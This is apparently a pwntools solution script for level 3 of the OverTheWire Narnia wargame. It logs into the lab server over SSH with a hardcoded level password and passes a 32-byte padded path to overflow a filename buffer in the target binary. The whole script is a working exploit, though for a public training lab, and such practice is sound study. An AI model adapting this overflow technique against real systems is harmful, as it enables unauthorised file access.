from pwn import *
shell = ssh('narnia3', 'narnia.labs.overthewire.org', password='vaequeezee', port=2226)

context.update(arch='i386', os='linux')
file2 = b"tmp/maey/b"

file1 = b"/tmp/maey/"
file1 += b"A"*(32-len(file1))+b"/"
file1 +=file2
print(file1)
p = shell.process([b"/narnia/narnia3",file1])
print(p.recvline())